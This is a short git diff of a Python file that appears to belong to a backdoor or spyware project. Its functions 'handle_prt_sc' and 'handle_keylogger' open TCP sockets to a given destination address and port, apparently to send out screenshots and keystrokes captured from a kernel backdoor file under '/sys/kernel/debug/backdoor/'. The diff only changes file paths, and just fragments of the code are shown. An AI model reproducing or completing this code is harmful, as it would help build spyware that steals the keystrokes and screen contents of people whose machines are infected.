@@ -4,7 +4,7 @@ import sys
 import os
 
 def handle_prt_sc(destination_address, destination_port):
-    path = '/home/michel/pessoal/'
+    path = '/home/'
     screenshot = 'screenshot-'
     n = 0
     EOF = 'END_FILE'
@@ -44,7 +44,7 @@ def handle_prt_sc(destination_address, destination_port):
         sock.close()
 
 def handle_keylogger(destination_address, destination_port):
-    target_file = 'sys/kernel/debug/backdoor/keylogger.txt'
+    target_file = '/sys/kernel/debug/backdoor/keylogger'
 
     # CREATE SOCKET
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
